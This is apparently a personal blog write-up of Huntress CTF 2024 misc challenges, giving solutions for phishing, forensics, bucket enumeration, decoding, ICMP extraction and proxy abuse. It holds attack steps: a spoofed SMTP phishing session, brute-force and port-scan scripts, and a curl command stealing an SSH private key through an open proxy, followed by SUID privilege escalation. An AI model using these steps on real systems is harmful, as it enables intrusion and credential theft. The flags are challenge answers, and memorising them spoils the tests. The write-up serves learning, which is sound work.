---
layout: page
title: Huntress CTF 24 Misc
tags: [CTF, Learning, Misc]
---

# Red Phish Blue Phish

An issue I had solving this initially was due to the fact `netcat` would append a crlf at the end on hitting ENTER. Connecting with the -C flag solved this to allow for the flag to be obtained. This one involved dabbling in manual SMTP comms. While not all the options were likely required, here is the data I submitted to get the flag:

```
220 red-phish-blue-phish-711f68aadeeeff81-74cd67c5f8-hj7ph Python SMTP 1.4.6
HELO pyrchdata.com
250 red-phish-blue-phish-711f68aadeeeff81-74cd67c5f8-hj7ph
MAIL FROM:<jdaveren@pyrchdata.com>
250 OK
RCPT TO:<swilliams@pyrchdata.com>
250 OK
DATA
354 End data with <CR><LF>.<CR><LF>
Subject: Important IT Update
From: "Joe Daveren" <jdaveren@pyrchdata.com>
To: "Sarah Williams" <swilliams@pyrchdata.com>

Hi Sarah,
   
We need to update the software in our WiFi Kettles. Please follow this link to get the instructions.

Kind regards,
Joe
.
250 OK. flag{54c6ec05ca19565754351b7fcf9c03b2}
```

# Nightmare on Hunt Street

**What is the IP address of the host that the attacker used?**

`10.1.1.42` - Ran Chainsaw and found this in lateral movement output.

**Times brute forced (jsmith)**

`32` - chainsaw output

**What is the name of the offensive security tool that was used to gain initial access? Answer in all lowercase.**

`psexec` - based on remote service being added (Event ID 7045) and the random named binary 

**How many unique enumeration commands were run with net.exe? Answer just the integer value.**

`3` - Performed search with Chainsaw for **net.exe**. Then a Regex in CyberChef to establish the count- CommandLine: .*

**What password was successfully given to the user created?**

`Susan123!` - found alongside previous answer

# Malibu

Going off the hint _"What do you bring to the beach?"_, this connection is likely for a bucket in the cloud. Nmap offered little in the service or provider detail so I tried curl instead. Access denied on just the address provided by the instance, however, appending /bucket returned an XML with bucket info!

Next step, bucket object enumeration with some GPT assistance. So I made a script to parse the key and send requests for the data. 

```python
import requests
import xml.etree.ElementTree as ET

# URL of the bucket
url = "http://challenge.ctf.games:31611/bucket"

# Namespace in the XML file
namespace = {'s3': 'http://s3.amazonaws.com/doc/2006-03-01/'}

# Function to download a file from the bucket using its key
def download_file(key):
	file_url = f"http://challenge.ctf.games:31611/bucket/{key}"
	try:
		response = requests.get(file_url, timeout=10)  # Set a timeout of 10 seconds
		# Check if the request was successful
		if response.status_code == 200:
			return response.content  # Return the content of the downloaded file
		else:
			print(f"Failed to download: {key} - Status code: {response.status_code}")
	except requests.exceptions.Timeout:
		print(f"Timeout error while trying to download: {key}")
	except requests.exceptions.RequestException as e:
		print(f"Error occurred while downloading {key}: {e}")
	
	return None  # Return None if download fails

# Main function to get the XML and download the keys
def main():
	try:
		# Step 1: Make a request to get the XML
		response = requests.get(url, timeout=10)  # Set a timeout for the XML request
		response.raise_for_status()  # Raise an error if the request was unsuccessful
		
		# Step 2: Parse the XML content using ElementTree and handle namespace
		tree = ET.ElementTree(ET.fromstring(response.content))
		root = tree.getroot()

		# Step 3: Find all <Key> tags within the <Contents> tags, accounting for the namespace
		for content in root.findall('s3:Contents', namespace):
			key_elem = content.find('s3:Key', namespace)
			if key_elem is not None:
				key = key_elem.text
				print(f"Found key: {key}")
				
				# Step 4: Download the file associated with the key
				file_content = download_file(key)
				if file_content and b'flag' in file_content:  # Check if 'flag' is in the contents
					print("Found flag in the file!")
					# Save the file locally using the key as the filename
					filename = key.replace("/", "_")  # Clean filename if necessary
					with open(filename, "wb") as f:
						f.write(file_content)
					print(f"Saved file: {filename}")
					break  # Stop downloading further files if flag is found
	except requests.exceptions.Timeout:
		print("Timeout error while trying to fetch the XML.")
	except requests.exceptions.RequestException as e:
		print(f"Error occurred while fetching XML: {e}")

if __name__ == "__main__":
	main()
```

After some tinkering, I opted to only save the content containing flag - using grep to extract it:

**`flag{800e6603e86fe0a68875d3335e0daf81}`**

# System Code

This challenge was probably THE BIGGEST PAIN of the competition in terms of its vagueness.

Ultimately, wasted a load of time trying to enumerate the platform and took to doing a code review. Even then, I wasn't 100% sure what to be looking for. At one point, the team and I mentioned the use of **backupGlpyhsTwr** but at the time (days if I recall) discarded it. We had started code review between the running service and the 'credited' page. Turns out, a key was to be made from **backupGlpyhsTwr** which was an array of a-f.

Using this array as a simple bruteforce key generator was sufficient to script and get the flag:

```python
import requests
import itertools
import concurrent.futures
from tqdm import tqdm

# URL for the challenge
url = "http://challenge.ctf.games:31412/enter="

# Function to send a request and check the result
def try_code(code):
    response = requests.get(f"{url}{code}")
    if "Incorrect" not in response.text:
        print(f"Success! The correct code is: {code}")
        print(f"Flag: {response.text}")
        return True
    return False

# Function to process permutations with multithreading
def bruteforce_with_permutations(chars, max_threads=10):
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
        all_permutations = [''.join(perm) for length in range(1, len(chars) + 1) for perm in itertools.permutations(chars, length)]
        
        future_to_code = {executor.submit(try_code, code): code for code in all_permutations}
        
        # Use tqdm to show progress and iterate through the futures
        for future in tqdm(concurrent.futures.as_completed(future_to_code), total=len(future_to_code)):
            if future.result():  # Stop if the correct code is found
                executor.shutdown(wait=False)
                break

# Character set a-f
chars = 'abcdef'

# Start bruteforcing with permutations
bruteforce_with_permutations(chars, max_threads=5) 
```

**`flag{dc9edf4624504202eec5d3fab10bbccd}`**

# Base-p-

Standard CyberChef options did not provide anything, then I recalled a similar challenge last year requiring a **base65536** [decoder](https://www.better-converter.com/Encoders-Decoders/Base65536-Decode). Success, of sorts in that now we have some base64 data. Decode in CyberChef with Gunzip to get an image which is a colour palette. Use this [site](https://imagecolorpicker.com/) to upload the image and obtain the hex of each colour to get build the flag:

**`flag{586cf8c849c9730ea7b2112fff39ff6a}`**

# Little Shop of Hashes

**What is the name of the service that the attacker ran and stopped, which dumped hashes on the first compromised host?**

Host B - `Remote Registry`

**What lateral movement technique did the threat actor use to move to the other machine?**

`Pass The Hash`

**What is the full path of the binary that the threat actor used to access the privileges of a different user with explicit credentials?**

`C:\Users\DeeDee\Documents\runasc.exe`

**How many accounts were compromised by the threat actor?**

Host A - `3` - Chainsaw, checked lateral movement output - excluding administrator = 3

**What is the full path of the binary that was used as a callback to the threat actor's machine?**

Host A - `C:\Users\DeeDee\Documents\nc.exe`

# 1200 transmissions

No luck with Audacity or Sonic Visualiser for quick checks of spectrum analysis. To me the file sounded like an old modem, so I Googled '1200 baud modem ctf' (hoping similar has been made as a challenge before!). To my delight, some writeups relating to modem tools. A quick skim of results finds this [tool](http://www.whence.com/minimodem/), which when downloaded and run like so:

`minimodem -r -f transmissions.wav 1200`

Reveals the flag:

**`flag{f28d133e7174c412c1e39b4a84158fa3}`**

# Echo Chamber (Scripting)

An interesting challenge, with a PCAP that is purely ping related traffic. Immediate thoughts are ping exfiltration, of which replies are often where to look for data. Other observations at this stage:

- 98 bytes per packet 
- 40 bytes of data 
- Data sections all consist of single byte i.e 40 A's or 40 B's etc.

I asked ChatGPT to write a script to extract all reply packets, take first character of the data section and if it matches my regex for common flag format, write it to file [a-gl0-9]:

```python
import re
from scapy.all import rdpcap, ICMP, IP

def extract_icmp_replies(pcap_file, output_file):
    # Define the regex pattern for allowed characters
    pattern = re.compile(r'[a-gl0-9{}]')
    
    # Read the pcap file
    packets = rdpcap(pcap_file)

    # Open the output file in binary mode
    with open(output_file, 'wb') as f:
        # Loop through each packet
        for packet in packets:
            # Check if the packet is an ICMP Echo Reply (ICMP type 0)
            if packet.haslayer(ICMP) and packet[ICMP].type == 0:
                raw_data = bytes(packet)
                
                # Ensure the packet size is 98 bytes
                if len(raw_data) == 98:
                    last_40_bytes = raw_data[-40:]
                    
                    # Get the first byte from the last 40 bytes
                    first_byte_of_last_40 = last_40_bytes[0]
                    
                    # Convert the byte to a printable character
                    char = chr(first_byte_of_last_40)
                    
                    # Check if the character matches the regex pattern
                    if pattern.match(char):
                        f.write(bytes([first_byte_of_last_40]))

if __name__ == "__main__":
    pcap_file = "echo_chamber.pcap"
    output_file = "output_filtered"
    
    extract_icmp_replies(pcap_file, output_file)
```

Grep the output for the flag:

**`flag{6b38aa917a754d8bf384dc73fde633ad}`**

# Permission to Proxy

Another of those challenges that took a solid team effor and plenty of theory testing. It seemed quite clear from a bit of research, that given the challenge and error page, the proxy was open to be utilised for queries. Some observations to note:

- Setting browser proxy to the challenge URL allows the hostname (from the returned page data) to be used - for instance, can connect to hostname:3128 or challenge.ctf.games can be changed to the hostname with the assigned port.
- Running vulnerable version of squid
  - https://vulert.com/vuln-db/debian-11-squid-159670
  - https://hackerone.com/reports/824802

Having failed to replicate the vulnerabilities, I took to researching other challenges that may have required a similar approach. Commonly, the proxy was used to access SSH onto a local host machine. Attempting this like so: 

```bash
curl -x http://challenge.ctf.games:30499 http://permission-to-proxy-8bd31fb26d8bcc71-59586fb8db-l4cbn:22 
SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.7
Protocol mismatch.
```

Trying to proxytunnel to a port and connect to localhost ssh presented more evidence this was the way to the flag, however, it only accepted ssh keys!

After banging heads against the wall for a while and wanting to turn all squid into calamari, we took to checking what other ports may be open (all 65535). The problem with this approach was even with some multithreading, the scan was slow - I gave up extending my session at around 20% and went to bed (or work I can't recall what hour this was solved!). Either way my teammate Kumomonomu had kept up the scanning, discovered that port 50000 was open and managed to get the flag.

I had to validate my script would have worked so I tested it again using ports closer to the known open one and sure enough, I got a match. _Note: HEAD requests were much quicker and also avoided port 50000 keepalive that would cause the script to hang_.

```python
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm 

# Configuration
base_url = "http://127.0.0.1:"
proxy = {"http": "http://challenge.ctf.games:30499"}
total_ports = 65535
open_ports = []

# Function to check a port
def check_port(port):
	try:
		url = f"{base_url}{port}"
		response = requests.head(url, proxies=proxy)
		if response.status_code == 200:
			return port
	except requests.RequestException:
		return None

# Using ThreadPoolExecutor for concurrent requests
with ThreadPoolExecutor(max_workers=10) as executor:
	futures = {executor.submit(check_port, port): port for port in range(1, total_ports + 1)}
	
	# Using tqdm to show progress
	for future in tqdm(as_completed(futures), total=total_ports, desc="Scanning Ports"):
		port = future.result()
		if port is not None:
			print(f"Port {port} is open (HTTP 200)")
			open_ports.append(port)

print("Scanning complete.")
print(f"Open ports: {open_ports}")
```

Use curl against the port to see a dir listing - then knowing an ssh key was needed, check /home to find **user**. Pull down the ssh key using:

```bash
curl -x http://challenge.ctf.games:30499 http://127.0.0.1:50000/home/user/.ssh/id_rsa
```

From there tunnel via proxy again to ssh on the localhost and connect with the key:

```bash
proxytunnel -p challenge.ctf.games:30499 -d 127.0.0.1:22 -a 1234
ssh -i id_rsa user@127.0.0.1 -p 1234
```

Nice, we're in! Now to escalate privileges. This was trivial and found searching for binaries with the SUID bit set:

```bash
find / -perm -4000 -exec ls -l {} \; 2>/dev/null
```

`/bin/bash` was one such binary. Utilised like so would reveal the flag:

![perm2proxy](/assets/img/huntress_ctf24/perm2proxy.png)
